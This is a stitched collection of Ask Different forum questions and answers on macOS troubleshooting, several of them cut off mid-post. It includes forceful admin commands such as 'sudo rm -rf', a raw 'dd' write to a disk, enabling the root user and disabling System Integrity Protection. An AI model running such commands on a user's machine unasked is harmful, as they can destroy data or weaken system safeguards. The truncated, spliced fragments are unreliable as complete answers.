I am coming from Linux world. I just realized that my MacBook is using Mac OS Extended (Journaled) partition type today and it's case-insensitive. That concerns me a lot as a developer. Because my previous life never use a case-insensitive partition. I will mainly use Terminal.app in MacBook and Homebrew, Xcode, Flutter etc. Will this case-insensitive partition give me any problems in the future? Since I am really new and wondering what other developers use and recommend for the partition type??\nI did find a case where Adobe Photoshop can not install on case-sensitive partition. So does it mean case-insensitive is more common than case-sensitive among users of macOS?\n\nA: \nWill this case-insensitive partition give me any problems in the future?\n\nNo. You should be fine.\nIn the default installation mode, the disk is formatted with case-insensitive filesystem (true for older OS releases before APFS). All the developer tools will continue to work fine without any issues. (I'd go ahead and state that the majority of folks run a Mac with this default case-insensitive format).\nI have personally seen apps (Photoshop, Steam) not working with case-sensitive filesystem and hence have abstained from using it.

Internet Recovery Mode of El Capitan with multiple OS installed? Thank you for your time. Here is my problem:\nA) Goal\nStart into Mac OS X El Capitan internet recovery mode and temporarily disable System Integrity Protection (SIP) to use (X11 functions of) Wineskin.\nB) Situation\nI've got two systems on my 2011 MacBook Pro as partitions:\n\n\n*\n\n*Mac OS X Snow Leopard 10.6.8; this is the default startup disk and the \"factory set\" OS (actually Lion) of the computer.\n\n*Mac OS X El Capitan 10.11.6; apparently without a recovery partition...\nI access this OS via the startup manager ([Opt key] at Mac chime).\nC) Problem\nTo boot into (internet) recovery mode I normally would press [(Opt +) Cmd + R] at the Mac chime and then disable SIP from the Terminal (csrutil).\nAs of the system configuration above, if I do this, it starts into internet recovery mode of Snow Leopard, where I cannot change the status of SIP because the csrutil command does not exist yet in this OS, of course.\n\n\n*\n\n*But my intention is to start into internet recovery mode of El Capitan, not Snow Leopard.\nHow can I achieve this with this configuration?\nD) What I've tried so far\n\n\n*\n\n*Enter the startup manager ([Opt] at chime), choose El Capitan and then hit [Cmd + R].\n= Does not start any recovery mode.\n\n*Change the default start up disk to El Capitan and hit [(Opt +) Cmd + R] at the chime.\n= Starts into Snow Leopard recovery mode...\n\n*Create a recovery partition this way.\n= Does not work; Recovery Partition Creator 4.0.4 seems broken.\nE) Additional Questions\nThose don't have to be answered necessarily, but if you do: Many thanks!\n\n\n*\n\n*I'd like to avoid reinstalling El Capitan to create a recovery partition since I believe in a simpler solution. But as a last straw, I'd do that of course. Would this be advisable?\n\n*If I installed El Capitan on an external drive, could I disable SIP from there (or its recovery partition) or would I run into the same problem?\n\n*Could I disable SIP via Firewire Disk Mode; that is from another computer (in this case OS X Sierra)?\n\n*Could I start into El Capitan recovery mode from verbose mode?\n\n*I'm probably mistaken, but does the EFI partitions which I see in terminal (diskutil list) have anything to do with the recovery mode? If yes, could I start into that (from verbose)?\n\n*Out of curiosity: Why didn't create El Capitan no recovery partition in the first place? (There is none when I do \"diskutil list\" in Terminal, only a \"Boot OS X\", but that's probably something about Snow Leopard...)  \nThank you very much in advance!\nRegards Jeremy\n\nA: 3 Solutions, or more likely workarounds\n(Found them myself, but thanks to Thorbjørn Ravn Andersen anyways!)\nTo reiterate and clarify: I want to start in recovery mode of El Capitan on a MacBook Pro 2011 which has said OS as a partition and on another the (\"factory set\") Snow Leopard. Since El Capitan had - for an for me unknown reason?! - no recovery partition installed, my actual goal was to start internet recovery mode of El Capitan. This did not work since whenever I pressed [Cmd + R] at the chime, it started into recovery mode of Snow Leopard, which doesn't contain the wanted terminal command \"csrutil\" yet.\nI went with option E)2. (above) and installed OS El Capitan on an empty external disk. After rebooting and holding the [Opt key] at the chime, I was able to choose the recovery partition of the newly installed system on the external drive, and afterwards disable SIP.\nThorbjørn Ravn Andersens solution will probably work too: A bootable USB stick - that's essentially the same as I did, but might be faster (?)... A third solution is probably (E)2.) reinstalling El Capitan to get the recovery partition (again?).\nBut even though those solutions (might) work, all of them include the time and space consuming (re-)installing of El Capitan. Since El Capitan should also have a internet recovery mode option it's unfortunate that one does not seem to be able to boot into that, if you have multiple (and older and \"factory set\") OS installed. (Option D)2., change the default start up disk to El Capitan and hit [(Opt +) Cmd + R] at the chime, should be working, but doesn't...)\nSo my Question is actually not solved completely, so I'll leave it open...\nThanks to every one who can give further advise! :D\n\nA: \nNote: I realize you stated you do not have a Recovery partition. This answer covers others with newer versions of macOS, where firmware updates eliminated the option of booting Recovery from the Mac Startup Manager. In your case, this answer will address how to disable System Integrity Protection (SIP).\n\nThe Mac Startup Manager may not let you select to boot from any/all of the Recovery partitions/volumes installed on your Mac. However, rEFInd Boot Manager will allow you to do this. You do not have to install rEFInd on to your internal drive. Instead, you can install rEFInd to a flash drive. Below are the steps to follow.\n>Note: You can also enable/disable System Integrity Protection (SIP) directly from the rEFInd menu. When booted to rEFInd, look for the icon labeled Change SIP Policy.\n\n\n*\n\n*Download the flash drive version of rEFInd. I will assume this will create the folder refind-flashdrive-0.11.3 in your Downloads folder. If you have a different version of rEFInd, then make the appropriate substitutions.\n\n*Insert a flash drive in a USB port.\n\n*Enter the Terminal application command diskutil list to determine the identifier of the flash drive. For example, disk1. If you have a flash drive identifier, then make the appropriate substitutions.\n\n*Enter the following command to change to downloaded rEFInd folder.\ncd  ~/Downloads/refind-flashdrive-0.11.3\n\n\n*Enter the following commands install rEFInd to your flash drive. This will erase all previous files on this drive.\ndiskutil unmountdisk disk1\nsudo dd if=refind-flashdrive-0.11.3.img of=/dev/disk1\n\n\n*Restart your Mac and hold down the option key. You can release the key when the Mac Startup Manager icons appear.\n\n*Choose the USB external drive icon labeled EFI Boot. This will boot the rEFInd Boot Manager.\n\n*Select to boot from the El Capitan recovery partition. If you have more than one version of macOS installed, then more than one Recovery icon may appear. You will have to determine the correct icon to choose by inspection.

Consequently, the backup size should be zero.\nOr, in the other scenario where I let it run the backup on it's own, after an hour, I expect tmutil compare to spit only the files I've edited. So, the backup size after an hour of development should be less than 10MB, and not over 1GB. \nSome pointers please? \n\nA: I would exclude those noisy apps that are storing configuration data in the application bundle. Even if you exclude them and all /Applications on a temporary basis, you can get a clean, small backup and know things are ok. Then you can see if these apps have an update or the developer can help and choose to exclude portions of them or live with their messy habits. \nYou can install Mac apps in other places and perhaps have a messy apps folder and put an alias to them in /Applications and exclude their folder long term. \n", "Q: Files stuck in Trash So I recently had to reinstall my OS on my MBP.  After the reinstall I attempted to open Chrome, but it would not open...I forget the error message.  It was like there was a file missing or something.  So, I tried to reinstall it and this was a struggle too, since I had to do it multiple times before it took.  One of the things I had to do was delete the old copy of Chrome and I used App Zapper for that, since I could not remove it any other way.  After deleting the App, I ended up with a bunch of folders in the Trash that I cannot delete no matter what I try.  These folders are mostly empty with the exception of one which is basically full of what appears to be folders containing all the various languages that Chrome supports, however those folders are all empty too.  When I try to delete these files, I get a message saying that they cannot be deleted because they are being used, yet when I check Activity Monitor, I cannot find them anywhere.  I do not use Chrome often, so i don't understand how these files can be in use but they can't be found running anywhere.  I have taken them out of Trash, put them in a different folder that I renamed and tried to delete them, but nothing.  I have tried commands from the Command Prompt, like -rm and I don't remember what else, but that doesn't work.  I have uninstalled Chrome again, and tried to delete them and nothing.  What can I do?\n[]\n[]2\n[]3\n[]4\n[]5\nAnd this just continues through all the language files, so you get the idea...  So let me reiterate, NONE of these files are actually in use no matter where I search for them, I can't find them.  So how do you delete files that not being used but the OS claims they are....?\nHere is the result of the rm -r * Terminal command:\n\n\n\n\n\nA: How about:\n\n\n*\n\n*Type the following with empty space at the end into Terminal:\n\nsudo rm -rf\n\n\n*Drag the files you want to delete (from the trash) into the Terminal window and hit ender.\n\n*Enter your password. Done? \nDisclaimer: Caution! The in this way deleted files are deleted forcefully and cannot be back easily. But I think you want exactly that...\n\nA: *\n\n*Open Terminal\n\n*cd ~/.Trash\n\n*ls and verify that these are indeed the files/folders in the trash\n\n*rm -r *\n\nA: Try using /Applications/Automator to create a System Service to delete items immediately.\nWhen you create a new document in Automator, choose Service as the type. For \"Service receives...\" in the pop-up at the top, select \"Files or Folders\", and in the App pop-up choose Finder.app.\nAdd the \"Run shell script\" action. Settings:\nShell: /bin/bash\nPass input: As Arguments\nscript contents:\nfor f in \"$@\"\ndo\nrm -r \"$f\"\ndone\n\nSave the service with a name you can find easily, such as \"Multi_instant_delete\". Open the trash folder, select the unwanted items, perform a contextual click on one of them, and choose \"Multi_instant_delete\" from the Services item in the pop-up menu. You'll be prompted for your admin password.\nIf nothing happens, you could try executing the same steps while logged in as root. To temporarily enable the root user with /System/Library/CoreServices/Applications/Directory Utility.app, open Directory Utility, click the lock and authenticate, then choose \"Enable Root User\" from the Edit menu. You will now see \"Other\" in the login window, which you will choose, then enter \"root\" as the user name, and the password you assigned using Directory Utility. After you have logged in as root, you can view the .Trash folder in the home folder of the account of the user with the issue. You may then be able to select the items and move them to the trash then delete. If you can't see the items, you may need to search for .Trash folders that exist elsewhere on your boot volume. You may want to create the Service as the root user. When you create the Service, you may need to move it from \"/var/root/Library/Services\" to \"/Library/Services\" for it to appear in Root's contextual menu. Use ⇧⌘+. to see the .Trash folder(s). \nTry leaving the original user logged in first, and if that doesn't work, then try by logging out of that user's account before logging in as root.\nBe very careful when using that Service while logged in as root!\nDon't forget to disable the root user in Directory Utility, if desired.\n", "Q: How to get synthesized disk root device from shell?

Ever since, although I do not have many apps installed, finder changes are shown very lately.. \nFor example: I take screenshots With keyboard shortcuts, they appear on desktop after some MINUTES..\nOr: I delete 100-150 files, they are still shown on finder window for some time, some of them without thumbnails.. \nDoes somebody have the same problem?\nFinder relaunch fixes everything. But I have to relaunch Finder after every change..\nHere is a screenshot of finder after I deleted some files. See the last column where \"the kind of file\" is shown. The removed files are still shown, but without any kind:\n\n\nA: There seems to be a problem with Finder's external sync (described in the thread on MacRumors).\nThis slowness was linked to 3rd party file sync applications (Google Drive, Syncovery, SugarSync, etc). There is no simple solution so far.\nThere is also a related Apple Communities' thread.\n\nA: I started experiencing this problem a few days ago after installing a utility called Funter which sits in the top menubar. Quitting it makes everything snappy again. So check what third-party stuff you've installed that runs all the time.\n", "Q: Help with turning on iCloud I use an iMac running macos High Sierra. I was trying to do something with my Documents folder and I turned off iCloud on my \"Desktop and Documents\" by unchecking the box in the System Preferences/icloud/option window as shown below.\n\nOnce I finished I wanted to turn iCloud back on by clicking the above checkbox. However, it will not turn back on. When I click on the checkbox the checkmark appears as shown below and a message saying \"Setting Up...\" appears.\nBut if I close System Preferences and then reopen them, the checkmark is gone. Can someone tell me how to turn iCloud on for \"Desktop and Documents\"\n\nA: Here's a description of what happens when you turn off Desktop & Documents folder. It might simplify things to move all the stuff that went into the Desktop and Documents folder that was created into the default Desktop folder or Documents folder (or distribute the items between those two folders), then delete the new Desktop and Documents folder to make things the way they were before the option was enabled originally. Then I would suggest logging out and back in before attempting to enable Desktop & Documents folders in iCloud prefpane again.\n", "Q: Intermittent input delay on keyboard (MacBook Pro 2018) I picked up the 2018 15\" MacBook Pro recently, and right away I'm noticing the slightest amount of input delay on the keyboard. It doesn't always happen, but it's noticeable when it does - the typing cursor sometimes visibly lags behind when I'm typing.\nIt seems like it's happening a lot in Chrome specifically, though it happens in other applications. I could just be using Chrome a lot more than other applications.\nSometimes I can't tell if it's even input delay or just general slowness, for example when switching windows with CMD+TAB sometimes the window change animation is slower (it looks like I can briefly see the current window go from opaque to semi-transparent).\nHas anybody run into the same problem, or does anybody have any ideas on how to verify whether this is happening? I notice it very clearly when I'm using my Mac, but since it's so unpredictable I'm skeptical of how reliable my observations actually are.\n\nA: I think I remember a problem from long ago related to the Dock. Try opening /Applications/Utilities/Terminal, then executing \"killall Dock\" (It comes right back). This may just be a workaround and you might have to do it whenever you experience the problem.\n\nA: Just to add to this - my lag was actually the bluetooth keyboard which I use separately - the battery level was at 52% but plugging it directly in instantly resolved the keyboard lag issue.\n\nA: Yes, the keyboard lag exists, you're not imagining things … nor are you the first to notice this behaviour. This fluctuating-delay happens because there's a T2 chip in the way, and the keyboard and trackpad are processed by the T2's own BridgeOS first before reaching the rest of the system that macOS can see and have influence over. Oh, and before you ask, using a Bluetooth keyboard is not going to be faster.\nSadly, until Apple actually acknowledge this additional annoyance caused by the T2, nothing will be done about it.\n\nA: Try using Safari instead of Chrome for a bit. Literally, ensure that it is NOT in the Dock or Activity Monitor at all. I'm betting the problem goes away. (Yes, I'm serious unfortunately). Chrome is an intense memory hog and has internal memory garbage collection that tries to run when the machine is idle. If you happen to begin typing or interacting just as it begins garbage collection, everything will lag for a very short time. If your lag is greater than 3 seconds though, you have other problems. \nYou'll find many complaints that battery life is horrible when running Chrome, but is magically restored when running Safari. The two problems are intertwined.\n", "Q: MacBook Pro with Touch Bar; switch between F keys, app controls and control strip? My previous MacBook Pro 15\" had physical function keys, which could be switched to media control keys by holding down the Fn key (or the other way around if you liked). I found this very handy, and would use both flavors of keys all the time.\nI've just switched to the newest MacBook Pro 15\", which lost the function/media keys, replacing them with this super-sexy Touch Bar. But, the Touch Bar is only an improvement if it can be used with the app-specific controls; otherwise it's just a screen pretending to be the missing keys. So, now I want access to all three Touch Bar modes:\n\n\n*\n\n*Media control keys:\n\n\n\n\n\n*Function keys:\n\n\n\n\n\n*App-specific control panel, e.g. from Google Chrome:\n\n\n\nThese are mutually exclusive; you can't show two at once. Problem: there seems to be no way to easily switch between the three modes. I can pick any two (switching between them using the Fn key), but access to the third is always out of reach.\nFor the moment I've settled on switching between function keys and app controls, with no media key access. But, whenever I start playing a video full-screen and find it too loud or too soft, I have to mouse to the top, wait for the menubar to appear, click the tiny speaker icon and then finally adjust the volume. It's a pain in the rear, and a definite downgrade.\nIs there any way to have quick and easy access to all three Touch Bar modes? (I'm using both Keyboard Maestro and BetterTouchTool, but neither seems to be able to switch Touch Bar modes.)\n\nA: It turns out that I wasn't clear on the four default modes for the Touch Bar:\n\n\n*\n\n*\"App Controls with Control Strip\"\n\n*\"Expanded Control Strip\"\n\n*\"App Controls\"\n\n*\"F1, F2, etc. Keys\"\n\n\nI wasn't clear (actually I think Apple wasn't clear) what the difference was between \"app controls\" and \"control strip\". Turns out, if I choose option 1, then I get a (somewhat narrowed) application-specific control bar, plus a (compacted) set of media control keys. So, that gives me access to my first and third desired modes. Then, set \"Press Fn key to\" to  \"Show F1, F2, etc. Keys\" and I'm golden.\n", "Q: Limit cellular data usage on iOS I have a cellular data contract which offers me a very small amount of data every month. Going over this data limit causes me to automatically be charged for an extra gigabyte, which I want to avoid. \nOn Android phones it is possible to set a data cap which prevents you from using a certain amount of data. So, for example, you can set the limit at 100 MB and your cellular data will turn off once you reach that limit. \nI have noticed a significant amount of “system services” data usage on my iPhone (which Apple does not allow you to control or disable all), which is why I am afraid I will inadvertently shoot over the data limit by accident. \nI am aware that there are third party applications which have widgets showing you your data usage, but this is not what I’m looking for. \nOne possibility is getting notifications when you’ve reached some limit, such as 100 MB. While not ideal, this helps in controlling data usage. However, my experience with the app I tried, My Data Manager, was quite lousy: it alerted me of my limit at the end of the day, long after I had, without realizing, spent 1 GB  of LTE data.\nAnother possibility is using a burner Android phone, putting the SIM card in it, creating a personal hotspot and using that with my iPhone. The Android phone would have the data limit instead of the iPhone. However, this is obviously a silly idea in practice. \nSo does iOS have a similar feature, either on vanilla iOS, a third-party app (e.g. through an automatically VPN), or some other app which makes monitoring this data passively easier (like the ones mentioned above)? Or is it the assumption by Apple that all iPhone users have unlimited data plans?\n\nA: It is not possible to have the phone disable your cellular data use when you reach a certain amount of usage, nor is it possible for it to notify you.\nMy experience is that most networks offer a service to notify you when you reach or just before you reach the limit, and some offer the option to cut off your data when you reach your limit taking you to a page where you can buy more.\nIt is unfortunate that this is the way it is, but I wouldn't speculate that Apple presumes everyone has unlimited data, but that data limits are a network issue, and that network providers often provide their own solutions to this, if your network doesn't that is unfortunate, but perhaps a consideration for when you choose your next network provider.\n", "Q: Mouse scroll stopped working with Less in Terminal For a few years now, Terminal.app in MacOS has supported mouse-scrolling with the less program, but today I noticed that it is no longer accepting mouse scrolls, and only works with the Up and Down keys now.\n\nWhat's not working:\nless and all other programs that use it are not accepting mouse scrolls. Instead, it scrolls the terminal window. These 'other' programs are:\n\n\n*\n\n*man\n\n*git log\n\n*diff\nPreviously, less would also clear the screen when closing it (q), but now the text remains on the screen.\n\nWhat I've tried:\n\n\n*\n\n*Tested other programs: vim for example, still accepts mouse scrolls\n\n*Used other Terminal emulators: less is not accepting mouse scrolls on Hyper either\n\n*Tested on another machine over SSH: Connected to one of my VPSes, and used less there within the Terminal app. Mouse-scrolls are working with it.\n\n*Used a newer version of less: Installed the latest version (530) of less using Homebrew, but it's not working with mouse scrolls either.\n\n\nSo I'm not sure what's wrong. Would greatly appreciate any help to make less accept mouse scrolls again.\n\nA: After going through a few other answers, I've realized there is a $LESS environment variable that contains default flags.\nIt's empty on my other Mac and Ubuntu system, but for some reason it's equal to -FRX on this machine, and that's causing these issues:\n\n\n*\n\n*-X caused it to NOT accept mouse scrolls\n\n*-F caused it to automatically exit for small files\n\n\nWhich is weird, since I never changed it, so it must've been modified by some other program. Anyways, manually setting it in my .rc files fixed the issue:\nexport LESS=\"-R\"\n\n\nSources:\n\n\n*\n\n*Unix & Linux: Neither 'less' or 'less -X' clear screen on exit\n\n*SuperUser: Less command clearing screen upon exit\n\nA: In case you're using less inside git (through git log or similar):\ngit-config docs have the answer:\n\nWhen the LESS environment variable is unset, Git sets it to FRX (if LESS environment variable is set, Git does not change it at all). If you want to selectively override Git’s default setting for LESS, you can set core.pager to e.g. less -S. This will be passed to the shell by Git, which will translate the final command to LESS=FRX less -S. The environment does not set the S option but the command line does, instructing less to truncate long lines. Similarly, setting core.pager to less -+F will deactivate the F option specified by the environment from the command-line, deactivating the \"quit if one screen\" behavior of less.\n\n(emphasis mine)\nTLDR:\n\n\n*\n\n*git is the one setting $LESS environment variable to FRX if empty\n\n*scrolling in less doesn't work with X option set\n\n*unset the default X option with git config --global --add core.pager \"less -+X\"\n", "Q: I was able to change lock screen wallpaper but can't change of that screen which comes after sleep on MacBook pro I was looking some ways to customise my mac, and I saw a way to change lock seer wallpaper by keeping the same name \"com.apple.desktop.admin.png\" as of the automated lock screen wallpaper\n \n\nWhen i opened my mac after shutdown\n\nI got that blurred image after i closed my mac's flap or lid and even by pressing sleep in the apple menu, how can I change it also?\n\nA: The best way to fix it instead of going through your cache is to use a free utility called Onyx.\nIt will enable you to change it very easily to whichever photo you like! \n\nA: I that blurred image is just the desktop image, so if you set that to what you want under System Preferences > Desktop and Screensaver it will appear as you want (blurred.)\nIn Mojave they stopped the blurring (from what I can tell)\n", "Q: netsh equivalent command in OSX How would I construct the bash equivalent of this command?\nnetsh -c interface ipv4 add neighbors \"Wi-Fi\" \"10.0.1.1\" \"b8:8d:12:57:2d:50\" store=persistent\n\nThanks!\n\nA: I think I found the equivalent:\nsudo arp -S 10.0.1.1 b8:8d:12:57:2d:50 ifscope en0\n\n", "Q: Fine-tuning \"Open safe files after downloading\" Is it possible to fine-tune the \"Open safe files after downloading\" setting in Safari?

This means the script will ignore this line, allowing it to return the value of the line above it, which is name of _P.

I'd like the last command to display login/logout information located on a volume from another Mac. I've mounted that volume at /Volumes/1013.\nWhere does last get that information from? I'd rather open the relevant log file and read it directly than use Terminal.\nImage added as answer to user nohillside below:\n\nSolved by Jaume (details below), basically:\nsudo chroot /Volumes/1013/ last -10\nworks for High Sierra, it didn't work for El Capitan, still very good though.\n\nA: last gets its information from /var/run/utmpx, a file that records user and tty sessions, shutdowns and reboots on the current system. utmpx is a binary file, which means you can't use less or grep to read it or search for keywords.\nSo to get the session information of the other Mac, we want last to read  /Volumes/1013/var/run/utmpx.\nUnfortunately, last can't be told to read a file different than /var/run/utmpx, but this is where chroot comes to the rescue. chroot takes two arguments, a path and a command, sets the command's perceived root directory to the specified path and executes it. \nIn our case, this is the command we need (type your login password when asked):\nsudo chroot /Volumes/1013/ last\n\nThis command changes the root directory to point to /Volumes/1013 so that when last reads /var/run/utmpx, it actually reads /Volumes/1013/var/run/utmpx.\nYou can pass options to last, if you wish, or pipe the output to grep for more relevant results, for example:\nsudo chroot /Volumes/1013/ last -10 | grep <some user>\n\nIf the command above doesn't work (for example, you get a segmentation fault), try this:\nsudo chroot /Volumes/1013/ /Volumes/1013/usr/bin/last -10 | grep <some user>\n\nthat is, run the executable from the other Mac.\nNote that there's a limit on how far back you can go with the macOS version with either method. \nFor example, with macOS \"Sierra\" 10.12, last worked as expected, while with OS X \"Mavericks\" 10.9, last only prints one line and then hangs. dtruss shows that a serious incompatibility is the reason for the hang:\n$ sudo dtruss -p 39542\ndtrace: system integrity protection is on, some features will not be available\nSYSCALL(args)        = return\ndtrace: 3870 dynamic variable drops with non-empty dirty list\nlseek(0x8, 0x4000, 0x0)      = 16384 0\ndtrace: error on enabled probe ID 2175 (ID 945: syscall::read_nocancel:return): invalid kernel access in action #12 at DIF offset 68\n\nYou can overcome this limitation by plugging the drive to a Mac running an older version of macOS.\nFor more information on chroot, run man chroot in Terminal.\n\nA: According to man last the relevant information is read from the utmpx file which (see man 5 utmpx) is stored in /var/run/utmpx. So if you are mounting volumes from another Mac on your network and the /var/ hierarchy of said Mac is accessible through the mount point you will find the data in /Volumes/1013/var/run/utmpx. Because utmpx is a binary format you would need to write your own little program to read it though (see man endutxent for the relevant access functions).\nYou could also try to use the -h host option of last to read the entries directly over the network (probably requires remote login to be enabled, never have used this and don't have a second Mac right now to try it).\n", "Q: What does launchctl unload actually do? When running launchctl unload some.plist, what is this command translated to specifically, in terms of UNIX commands, etc.\nThere is nothing in .plist files that specifies any \"command line to run when the user specifies unload\", so does macOS simply send a kill signal to the process? Or what does it do?\n\nA: SIGTERM\nlaunchd's unload command sends a SIGTERM signal to the associated job's child processes.\nDetached Processes\nIf a process launched by a launchd job has detached from it's parent process, then unload will not affect that process. This is often the case for daemonised processes.\nOriginal Source Code\nYou can download and inspect the original launchd source code. launchd has since been rewritten and is proprietary to Apple but the original documents the intended behaviour on unload.\n\nA: To best answer this question we can look at two things: UNIX commands and what is in a .plist.\nStarting out with a .plist, the following code is usually there\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>CFBundleExecutable</key>\n  <string>someApplication</string>\n</dict>\n</plist>\n\nThe CFBundleExecutable identifies the name of the bundle’s main executable file. For an app, this is the app executable. For a loadable bundle, it is the binary that will be loaded dynamically by the bundle.\nSo typing launchctl unload some.plist will tell MacOS the key to locate the bundle’s executable file and 'unload' it or essentially kill it from the system.\nThis is telling it at an application level.\nWhen using a UNIX command such as kill <PID> it is in reference to a specific process.\nLooking at what is a Process vs Application here is good reading\n\nYou can read further into what is in .plists and how they work over at Apple \n", "Q: Can I use a Seagate SSHD in my iMac and if so, how do I load OSX (High Sierra) onto it I'm looking to upgrade my iMac 14.2 (late 2013) by swapping out the existing HDD with a Seagate SSHD Hybrid drive, along with adding another 8Gb memory. I've done a similar upgrade on my daughter's iMac (same model) but used a SSD and it works great with major enhancement in speed. I would like to use a SSHD to save some money. Is there anything I need to do differently when installing a CLEAN version of High Sierra (I have already downloaded to a USB drive from the Apple APP store) onto the SSHD Hybrid? \n\nA: Yes, you can use a Seagate SSHD on your 2013 iMac. \n\nInstalling a new version of High sierra I would recommend formatting the disk to APFS, which is Apple's new optimised SSD & 'fusion' file format. Everything else will work fine.\n\nThe way the SSHD works is the SSD portion is just cached, and the drive itself manages what goes into the cache rather than the OS.\n\nSeagate SSHD had some issues with the newer drive models in older macs, but that is mainly due to being a 3Gb/s SATA connector.\nAs your late 2013 machine has 6Gb/s SATA, any seagate drive (Firecuda (new model) or momemntus (old model)) will be compatable.\nYou can read a little bit more into it on the Apple website, if you're interested in in-depth info.\n", "Q: Preventing \"pocket calls\" - iOS 11 I know someone who is always \"pocket calling\" people, this happens because they use their phone (an iPhone 6s running iOS 11.4) they just put it back in their pocket and dont lock it.

The problem:\nAll applications that are launched on the iMac take a very long time to start. E.g. on a clean startup Word takes about 40 seconds to fully start, Adobe Reader about double. The same problem also happens when starting things like the settings menu. \nStarting multiple applications simultaneously often leads to a complete stall. \nOnce an application is (or multiple applications are) running there isn't really a noticeable lack of performance anymore.\nSteps taken so far:\n\n\n*\n\n*Fully updated macOS via AppStore as well as all relevant 3rd party software. Also cleared ~/Library/Caches and many cache related folders of individual applications.\n\n*Ran a check of the HD via Disk Utility, it did not find anything wrong. \n\n*Ran ps aux in Terminal to see if any application or process is slowing things down. Yet I did not find any particular program, the highest CPU and MEM usage mostly coming from Terminal itself and not surpassing 5%.\n\n*Ran a full check of the system integrity via OnyX (Maintenance Tab - first checkbox). It did not report any problem. \n\n*Ran EtreCheck 3 times to see if any clear problem would present itself. No major issues where found. Three minor issues appeared:\n\n*Upgradeable RAM - (the iMac runs on 4GB, 1333Mhz)   \n\n*Unsigned files - Which resolved to launch agents of Adobe, Skype, etc.   \n\n*Low performance – EtreCheck report took over 5 minutes to run. This is unusual. - NB: Problem only appeared once in three runs of EtreCheck.\nThe full EtreCheck report can be found here.\n\n*Ran Apple Hardware Test (by pressing D during startup). It showed an error: 4SNS/1/40000000:TH00-9.000 which led to this possible cause / answer. Basically it boils down to problems with newly installed HD's that do not have a circuitry for fan sensors integrated into the drives.\nCurrent gut-feeling:\nThe low-ram mentioned by EtreCheck might be part of the problem, but I would find it strange if a 4GB RAM would cause such a slow iMac, especially when ps aux isn't reporting any real activity most of the time. Also, I would not understand why the problem occurs mostly during the launch of applications while not slowing them down once they are up and running. \nThe problem found by Apple Hardware Test resolves to a problem with the temperature-regulation of off-the-shelf HD's. The iMac did indeed receive a new HD at one point in its life, it was installed by a professional computer store (though not Apple). So my gut feeling is that maybe this is what is slowing it down. This answer would strengthen that believe, yet it doesn't really explain why it would cause the problems that I am experiencing. \nQuestions left unanswered:\n\n\n*\n\n*Apple Hardware Test stops after it detects the error mentioned above; is there anyway I can force it to continue its test to see if there might be anymore errors?\n\n*Could a fully functioning hard-disk cause the problems as described simply by badly communicating fan-sensors?\n\n*What else could I do personally to further diagnose the exact problem?\n\n\nA: Although your times seem too long, this could be due to your HDD. You said it was replaced, any idea on the specs?  A slow drive can be indicated by the problem you describe. Loading an app may be very slow since it is being read off the HDD. Once loaded the speed will be determined by your RAM unless you output a lot of data to disk.\n", "Q: How to transfer a PDF file to my picture album on my iPhone I have an iPhone and when I was saving some pictures I saved them as PDF in iBooks.

This is why iCloud Photo Library stores the complete library in iCloud storage.\nConsider requirement #2: in order to sync, each picture must be uploaded to a readily available resource and then each device needs to be alerted to that fact and download it. Again, this is exactly what iCloud Photo Library and/or PhotoStream do.\nHere's what I do, which might help. I also have multiple Macs and iOS devices. All of them use my Apple ID and I have turned off iCloud Photo Library, but turned on PhotoStream. I have personally designated one of my Macs as the Master Photo Library (MPL). Any pictures I take with any device automatically show up in my MPL. Those pictures are also available on other iOS devices within the limits of PhotoStream (PhotoStream only keeps the last 30 days and a max of 1000 photos). Once a picture is no longer in the PhotoStream (31 days later, or 1001 photos later), the picture is still available on the device that took the picture, but, it's also permanently saved in my MPL.\nVideos are of course another thing. It's called PhotoStream, after all. So, every time I take videos I care about, I connect the iOS device with a cable to the MPL and offload them.\nThis does not accomplish exactly what you want, but it gets very close. It's the best answer I can come up with. The only thing \"better\" is using iCloud Photo Library, which I don't use only because of the monthly cost, not because of security.\n\nA: As others also have said, in order to do that your MBP has to act like a server, which is not generally what it's suited for.\nSo you would need at least something like iCloud. \nI think the option with the best privacy, security and cost combo is Home NAS + OwnCloud + real IP. It requires some manual setup and upfront expenses though.\nBut any \"push the button\" solution would require you to trust third-party with your privacy same as iCloud.\nSo in order to do that:\n\n\n*\n\n*Choose hardware. Can't really help you with that. I would try LaCie first, file storage is not too cpu-intensive if that's what you mean by low-powered. Depends on usage of course.\n\n*Choose software. There is plenty \"nextcloud vs owncloud\" info on the web. Let's say NextCloud for now.\n\n*Install NextCloud server on your NAS. Finding \"NextCloud on [yourNAS]\" guide shouldn't be a problem either. Depending on this step you may decide to change your software choice ) or hardware for that matter.\n\n*Expose the NAS to the Internet. \n\n\n*\n\n*Check if your ISP provides you with public IP address: either ask them, or login to your router and check what IP is assigned to WAN interface. Private IPs (as opposed to public) look like this: 192.168.##.##, 172.16-31.##.## or 10.##.##.##. Others are public.\n\n*If you have public IP address, set up port forwarding on your router: [publicIP]:[NextCloudPort] to [IPofNAS]:[NextCloudPort]. You can benefit from buying a domain name, but it is not strictly necessary.\n\n*If you don't have public IP, you have a couple of options:\n\n\n*\n\n*Request one from your ISP and go for port forwarding described above. Some ISPs provide it as a paid option.\n\n*Setup \"Dynamic DNS\" on your router if it supports the feature.\n\n*Setup \"reverse tunnel\" from NAS to some VPS as a last resort.\n\n\n\n*Install NextCloud client app on all macs and IOS devices and login to your server.\n\n*Configure partial sync in NextCloud client apps so everything is not copied to client devices.\n\n*Configure automatic photo upload in NextCloud client app on IOS devices.\n\n\nWith this setup all your files will be stored on the NAS. Any device would be able to list the files and download only what is needed. Photos will be auto-uploaded to the NAS.\n", "Q: MacBook pro stuck in a loop after booting yesterday i turned off my computer as usual nothing strange yet ive noticed that it get so hot lately ( I figured out later that it’s due to dirt in fan , i cleaned it ) ; then today morning computer stucked in a black loop after apple logo , it shows in a half second cursor then it turn.

